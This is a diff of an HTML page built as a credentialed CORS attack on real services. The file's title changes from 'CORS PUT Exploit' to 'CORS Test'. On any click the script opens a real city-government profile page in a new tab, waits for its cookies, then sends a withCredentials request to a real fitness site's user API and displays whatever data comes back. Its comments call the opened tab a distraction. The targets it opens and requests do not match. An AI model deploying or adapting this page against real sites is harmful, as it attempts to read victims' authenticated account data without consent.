@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>CORS PUT Exploit</title>
+    <title>CORS Test</title>
 </head>
 <body>
     <p>Click anywhere on this page to trigger the Cross-origin request.</p>
@@ -11,17 +11,25 @@
         document.addEventListener("DOMContentLoaded", () => {
             let isAttacking = false;
             
-            document.onclick = () => {
+            document.onclick = async () => {
                 if (isAttacking) return; 
                 
                 isAttacking = true;
                 
-                // Open target site in new tab (distraction)
-                window.open('https://www.myfitnesspal.com');
+                // Open target site in new tab - this loads their cookies
+                const targetWindow = window.open('https://mein.wien.gv.at/Mein-Profil');
                 
-                // Execute CORS request
+                // Wait for cookies to be loaded/set (adjust delay as needed)
+                console.log("Waiting for cookies to load...");
+                await delay(3000); // 3 second delay
+                
+                // Execute CORS request WITH credentials
                 makeCorsRequest();
             };
+            
+            function delay(ms) {
+                return new Promise(resolve => setTimeout(resolve, ms));
+            }
             
             function makeCorsRequest() {
                 var xhttp = new XMLHttpRequest();
@@ -29,19 +37,35 @@
                 xhttp.onreadystatechange = function() {
                     if (this.readyState == 4) {
                         console.log("Status:", this.status);
-                        if (this.status == 200) {
+                        if (this.status >= 200 && this.status < 300) {
                             console.log("Response:", this.responseText);
-                            alert("Success! Response: " + this.responseText);
-                            document.getElementById("response").innerHTML = this.responseText;
+                            alert("Request succeeded! Status: " + this.status);
+                            document.getElementById("response").innerHTML = 
+                                "Success! Status: " + this.status + "<br>Response: " + 
+                                (this.responseText.substring(0, 200) || "Empty response");
                         } else {
                             console.error("Error:", this.status, this.statusText);
-                            alert("Error: " + this.status);
+                            document.getElementById("response").innerHTML = 
+                                "Error: " + this.status + " " + this.statusText;
                         }
                     }
                 };
-
+                
+                xhttp.onerror = function() {
+                    console.error("Network error occurred");
+                    document.getElementById("response").innerHTML = "Network error - CORS likely blocked";
+                };
+                
+                // This URL might need adjustment - check the actual API endpoint
                 xhttp.open("GET", "https://www.myfitnesspal.com/api/services/users", true);
+                
+                // CRITICAL: This sends cookies with the request
                 xhttp.withCredentials = true;
+                
+                // Add some headers that might be expected
+                xhttp.setRequestHeader("Content-Type", "application/json");
+                
+                console.log("Sending CORS request with credentials...");
                 xhttp.send();
             }
         });
